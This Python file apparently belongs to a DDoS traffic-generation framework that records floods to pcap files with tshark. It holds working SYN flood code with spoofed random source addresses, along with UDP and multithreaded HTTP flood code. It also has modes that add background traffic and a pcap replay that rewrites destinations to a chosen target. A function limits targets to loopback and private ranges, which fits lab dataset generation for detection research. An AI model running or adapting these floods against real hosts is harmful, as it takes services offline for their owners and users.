import os
import time
import random
import socket
import threading
import multiprocessing
import subprocess
from datetime import datetime

from scapy.all import IP, TCP, UDP, Raw, send, PcapReader

# paths
DATA_DIR = "/root/ddos-framework/data"
PCAP_DIR = os.path.join(DATA_DIR, "pcap")
RESULTS_DIR = "/root/ddos-framework/results/reports"

# how many processes for SYN/UDP
PROCS = {
    "LOW": 1,
    "MEDIUM": 2,
    "HIGH": 4,
}

# how many threads for HTTP
HTTP_THREADS = {
    "LOW": 4,
    "MEDIUM": 16,
    "HIGH": 64,
}


def _check_target(target):
    import ipaddress
    try:
        ip = ipaddress.ip_address(target)
        if ip.is_loopback:
            return True
        for net in ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]:
            if ip in ipaddress.ip_network(net, strict=False):
                return True
        return False
    except ValueError:
        return False


def _make_packet(attack_type, target, port):
    if attack_type == "SYN":
        src = ".".join(str(random.randint(1, 254)) for _ in range(4))
        return IP(src=src, dst=target) / TCP(
            sport=random.randint(1024, 65535),
            dport=port,
            flags="S"
        )
    elif attack_type == "UDP":
        payload = bytes(random.randint(0, 255) for _ in range(100))
        return IP(dst=target) / UDP(
            sport=random.randint(1024, 65535),
            dport=port
        ) / Raw(load=payload)
    return None


def _sender_worker(attack_type, target, port, count, stop_event, result_queue):
    pid = os.getpid()
    sent = 0
    start = time.time()

    for _ in range(count):
        if stop_event.is_set():
            break
        try:
            pkt = _make_packet(attack_type, target, port)
            send(pkt, verbose=0)
            sent += 1
        except Exception:
            break

    elapsed = time.time() - start
    result_queue.put({"pid": pid, "sent": sent, "elapsed": elapsed})


def _run_synthetic(attack_type, intensity, target, duration, port):
    """original SYN/UDP flood - no mixing"""
    procs = PROCS.get(intensity, 1)
    est_rate = 30 * procs
    total = est_rate * duration
    per_proc = total // procs if procs > 0 else total

    print(f"[syn] intensity={intensity} procs={procs} duration={duration}s")

    os.makedirs(PCAP_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_file = f"{attack_type}_{intensity}_{duration}s_{ts}.pcap"
    pcap_path = os.path.join(PCAP_DIR, pcap_file)

    tshark = subprocess.Popen(
        ["tshark", "-i", "lo", "-w", pcap_path,
         "-f", f"host {target} and port {port}",
         "-a", f"duration:{duration + 4}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    stop_event = multiprocessing.Event()
    result_queue = multiprocessing.Queue()
    workers = []

    t0 = time.time()
    for _ in range(procs):
        p = multiprocessing.Process(
            target=_sender_worker,
            args=(attack_type, target, port, per_proc, stop_event, result_queue)
        )
        p.start()
        workers.append(p)

    time.sleep(duration)
    stop_event.set()

    for p in workers:
        p.join(timeout=2)
        if p.is_alive():
            p.terminate()

    tshark.wait(timeout=5)
    if tshark.poll() is None:
        tshark.terminate()

    results = []
    for _ in range(procs):
        try:
            results.append(result_queue.get(timeout=2))
        except:
            break

    actual = time.time() - t0
    total_sent = sum(r["sent"] for r in results)
    effective_rate = total_sent / actual if actual > 0 else 0

    print(f"[syn] done: {total_sent} packets in {actual:.2f}s ({effective_rate:.0f} pps)")

    return {
        "pcap_file": pcap_file,
        "pcap_path": pcap_path,
        "sent": total_sent,
        "duration": actual,
        "rate": effective_rate,
        "mode": "SYNTHETIC",
    }


def _run_synthetic_mixed(attack_type, intensity, target, duration, port, mix_ratio=0.15):
    """SYN/UDP flood with some background traffic to make it realistic"""
    procs = PROCS.get(intensity, 1)
    est_rate = 30 * procs
    total = est_rate * duration
    per_proc = total // procs if procs > 0 else total

    print(f"[mixed] attack={attack_type} intensity={intensity} procs={procs} mix={mix_ratio}")

    os.makedirs(PCAP_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_file = f"{attack_type}_{intensity}_{duration}s_{ts}.pcap"
    pcap_path = os.path.join(PCAP_DIR, pcap_file)

    tshark = subprocess.Popen(
        ["tshark", "-i", "lo", "-w", pcap_path,
         "-f", f"host {target} and port {port}",
         "-a", f"duration:{duration + 4}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    stop_event = multiprocessing.Event()
    result_queue = multiprocessing.Queue()
    workers = []

    t0 = time.time()

    # main attack workers
    for _ in range(procs):
        p = multiprocessing.Process(
            target=_sender_worker,
            args=(attack_type, target, port, per_proc, stop_event, result_queue)
        )
        p.start()
        workers.append(p)

    # background traffic - makes it look more realistic
    bg_sent = [0]

    def bg_worker():
        start = time.time()
        while time.time() - start < duration:
            if random.random() < mix_ratio:
                try:
                    if attack_type == "SYN":
                        # send some HTTP requests during SYN flood
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect((target, port))
                        s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
                        s.close()
                        bg_sent[0] += 1
                    elif attack_type == "UDP":
                        # send some SYN packets during UDP flood
                        src = ".".join(str(random.randint(1, 254)) for _ in range(4))
                        pkt = IP(src=src, dst=target) / TCP(
                            sport=random.randint(1024, 65535),
                            dport=port,
                            flags="S"
                        )
                        send(pkt, verbose=0)
                        bg_sent[0] += 1
                except:
                    pass
            time.sleep(random.uniform(0.1, 0.5))

    bg_thread = threading.Thread(target=bg_worker)
    bg_thread.start()

    time.sleep(duration)
    stop_event.set()

    for p in workers:
        p.join(timeout=2)
        if p.is_alive():
            p.terminate()

    bg_thread.join()

    tshark.wait(timeout=5)
    if tshark.poll() is None:
        tshark.terminate()

    results = []
    for _ in range(procs):
        try:
            results.append(result_queue.get(timeout=2))
        except:
            break

    actual = time.time() - t0
    total_sent = sum(r["sent"] for r in results)

    print(f"[mixed] done: {total_sent} attack + {bg_sent[0]} bg packets in {actual:.2f}s")

    return {
        "pcap_file": pcap_file,
        "pcap_path": pcap_path,
        "sent": total_sent + bg_sent[0],
        "duration": actual,
        "rate": total_sent / actual if actual > 0 else 0,
        "mode": "MIXED",
        "bg_sent": bg_sent[0],
    }


def _run_http_socket(target, port, intensity, duration):
    """original HTTP flood - no mixing"""
    num_threads = HTTP_THREADS.get(intensity, 4)
    print(f"[http] intensity={intensity} threads={num_threads} duration={duration}s")

    os.makedirs(PCAP_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_file = f"HTTP_{intensity}_{duration}s_{ts}.pcap"
    pcap_path = os.path.join(PCAP_DIR, pcap_file)

    tshark = subprocess.Popen(
        ["tshark", "-i", "lo", "-w", pcap_path,
         "-f", f"host {target} and port {port}",
         "-a", f"duration:{duration + 2}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    requests_made = [0]
    lock = threading.Lock()

    def http_worker():
        start = time.time()
        while time.time() - start < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((target, port))
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
                s.send(request.encode())
                with lock:
                    requests_made[0] += 1
                s.close()
            except:
                pass

    threads = []
    t0 = time.time()

    for _ in range(num_threads):
        t = threading.Thread(target=http_worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    tshark.wait(timeout=5)
    if tshark.poll() is None:
        tshark.terminate()

    actual = time.time() - t0
    rate = requests_made[0] / actual if actual > 0 else 0

    print(f"[http] done: {requests_made[0]} requests in {actual:.2f}s ({rate:.0f} req/s)")

    return {
        "pcap_file": pcap_file,
        "pcap_path": pcap_path,
        "sent": requests_made[0],
        "duration": actual,
        "rate": rate,
        "mode": "HTTP_SOCKET",
    }


def _run_http_socket_mixed(target, port, intensity, duration, mix_ratio=0.1):
    """HTTP flood with some UDP packets mixed in"""
    num_threads = HTTP_THREADS.get(intensity, 4)
    print(f"[http-mixed] intensity={intensity} threads={num_threads} mix={mix_ratio}")

    os.makedirs(PCAP_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_file = f"HTTP_{intensity}_{duration}s_{ts}.pcap"
    pcap_path = os.path.join(PCAP_DIR, pcap_file)

    tshark = subprocess.Popen(
        ["tshark", "-i", "lo", "-w", pcap_path,
         "-f", f"host {target} and port {port}",
         "-a", f"duration:{duration + 2}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    requests_made = [0]
    udp_sent = [0]
    lock = threading.Lock()

    def http_worker():
        start = time.time()
        while time.time() - start < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((target, port))
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
                s.send(request.encode())
                with lock:
                    requests_made[0] += 1
                s.close()
            except:
                pass

    def udp_worker():
        start = time.time()
        while time.time() - start < duration:
            if random.random() < mix_ratio:
                try:
                    payload = bytes(random.randint(0, 255) for _ in range(50))
                    pkt = IP(dst=target) / UDP(
                        sport=random.randint(1024, 65535),
                        dport=port
                    ) / Raw(load=payload)
                    send(pkt, verbose=0)
                    with lock:
                        udp_sent[0] += 1
                except:
                    pass
            time.sleep(random.uniform(0.2, 1.0))

    threads = []
    t0 = time.time()

    for _ in range(num_threads):
        t = threading.Thread(target=http_worker)
        t.start()
        threads.append(t)

    udp_thread = threading.Thread(target=udp_worker)
    udp_thread.start()
    threads.append(udp_thread)

    for t in threads:
        t.join()

    tshark.wait(timeout=5)
    if tshark.poll() is None:
        tshark.terminate()

    actual = time.time() - t0
    rate = requests_made[0] / actual if actual > 0 else 0

    print(f"[http-mixed] done: {requests_made[0]} HTTP + {udp_sent[0]} UDP in {actual:.2f}s")

    return {
        "pcap_file": pcap_file,
        "pcap_path": pcap_path,
        "sent": requests_made[0] + udp_sent[0],
        "duration": actual,
        "rate": rate,
        "mode": "HTTP_MIXED",
        "udp_sent": udp_sent[0],
    }


def _run_replay(pcap_file, target, port, duration, speed):
    if not os.path.exists(pcap_file):
        raise FileNotFoundError(f"pcap not found: {pcap_file}")

    print(f"[replay] file={pcap_file} speed={speed}x duration={duration}s")

    os.makedirs(PCAP_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = f"REPLAY_{os.path.basename(pcap_file)}_{ts}.pcap"
    out_path = os.path.join(PCAP_DIR, out_file)

    tshark = subprocess.Popen(
        ["tshark", "-i", "lo", "-w", out_path,
         "-a", f"duration:{duration + 4}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    t0 = time.time()
    sent = 0

    with PcapReader(pcap_file) as reader:
        for pkt in reader:
            if time.time() - t0 >= duration:
                break

            if pkt.haslayer(IP):
                pkt[IP].dst = target
                if pkt.haslayer(TCP) and port:
                    pkt[TCP].dport = port
                elif pkt.haslayer(UDP) and port:
                    pkt[UDP].dport = port

            try:
                send(pkt, verbose=0)
                sent += 1

                if speed != 1.0:
                    expected = t0 + (sent / (1000 * speed))
                    delay = expected - time.time()
                    if delay > 0:
                        time.sleep(delay)
            except Exception:
                continue

    actual = time.time() - t0
    tshark.wait(timeout=5)

    print(f"[replay] done: {sent} packets in {actual:.2f}s")

    return {
        "pcap_file": out_file,
        "pcap_path": out_path,
        "sent": sent,
        "duration": actual,
        "rate": sent / actual if actual > 0 else 0,
        "mode": "REPLAY",
        "source": pcap_file,
    }


def _bg_worker(pcap, target, port, duration, queue):
    try:
        r = _run_replay(pcap, target, port, duration, 0.3)
        queue.put(r)
    except Exception as e:
        queue.put({"error": str(e)})


def _run_hybrid(attack_type, intensity, target, duration, port, bg_pcap):
    print(f"[hybrid] bg={bg_pcap} attack={attack_type}/{intensity}")

    bg_queue = multiprocessing.Queue()
    bg_proc = multiprocessing.Process(
        target=_bg_worker,
        args=(bg_pcap, target, port, duration, bg_queue)
    )
    bg_proc.start()

    if attack_type == "HTTP":
        result = _run_http_socket(target, port, intensity, duration)
    else:
        result = _run_synthetic(attack_type, intensity, target, duration, port)

    bg_proc.join(timeout=duration + 10)
    if bg_proc.is_alive():
        bg_proc.terminate()

    try:
        bg_result = bg_queue.get(timeout=2)
    except:
        bg_result = {"error": "bg failed"}

    result["mode"] = "HYBRID"
    result["bg_pcap"] = bg_pcap
    result["bg_result"] = bg_result

    return result


def _write_log(result, attack_type, intensity, target, duration, port):
    lines = [
        "=" * 50,
        "DDoS Traffic Generation Log",
        "=" * 50,
        f"Time:     {datetime.now().isoformat()}",
        f"Mode:     {result['mode']}",
        f"Type:     {attack_type}",
        f"Intensity: {intensity}",
        f"Target:   {target}:{port}",
        f"Duration: {duration}s",
        f"Sent:     {result.get('sent', 'N/A')}",
        f"Rate:     {result.get('rate', 0):.0f} req/s",
        f"PCAP:     {result['pcap_file']}",
    ]

    if result["mode"] == "REPLAY":
        lines.append(f"Source:   {result.get('source', 'N/A')}")

    if result["mode"] == "HYBRID":
        lines.append(f"BG PCAP:  {result.get('bg_pcap', 'N/A')}")

    if result["mode"] in ("MIXED", "HTTP_MIXED"):
        lines.append(f"BG Sent:  {result.get('bg_sent', 0)}")

    lines.append("=" * 50)

    os.makedirs(RESULTS_DIR, exist_ok=True)
    log_path = os.path.join(RESULTS_DIR, "experiment_log.txt")
    with open(log_path, "w") as f:
        f.write("\n".join(lines) + "\n")

    return "\n".join(lines) + "\n"


def run_attack(attack_type, intensity, target, duration, port,
               pcap_file=None, bg_pcap=None, speed=1.0, mixed=True):
    """
    Run DDoS attack generation.

    mixed=True: Adds background traffic for realistic signatures (default)
    mixed=False: Pure attack traffic (original behavior)
    """
    if attack_type not in ("SYN", "HTTP", "UDP"):
        raise ValueError(f"bad attack type: {attack_type}")

    if intensity not in PROCS:
        raise ValueError(f"bad intensity: {intensity}")

    if not _check_target(target):
        raise PermissionError(f"target {target} not allowed")

    if not (1 <= duration <= 300):
        raise ValueError(f"bad duration: {duration}")

    if not (1 <= port <= 65535):
        raise ValueError(f"bad port: {port}")

    if target != "127.0.0.1":
        print(f"[!] Warning: target is {target}")

    if pcap_file:
        print(f"[main] REPLAY mode: {pcap_file}")
        result = _run_replay(pcap_file, target, port, duration, speed)
    elif bg_pcap:
        print(f"[main] HYBRID mode: {bg_pcap}")
        result = _run_hybrid(attack_type, intensity, target, duration, port, bg_pcap)
    elif attack_type == "HTTP":
        if mixed:
            print(f"[main] HTTP MIXED mode: {intensity}")
            result = _run_http_socket_mixed(target, port, intensity, duration)
        else:
            print(f"[main] HTTP SOCKET mode: {intensity}")
            result = _run_http_socket(target, port, intensity, duration)
    else:
        if mixed:
            print(f"[main] {attack_type} MIXED mode: {intensity}")
            result = _run_synthetic_mixed(attack_type, intensity, target, duration, port)
        else:
            print(f"[main] SYNTHETIC mode: {attack_type}/{intensity}")
            result = _run_synthetic(attack_type, intensity, target, duration, port)

    log = _write_log(result, attack_type, intensity, target, duration, port)

    return result["pcap_file"], log


if __name__ == "__main__":
    pcap, log = run_attack("SYN", "LOW", "127.0.0.1", 5, 8080)
    print(f"Generated: {pcap}")
    print(log)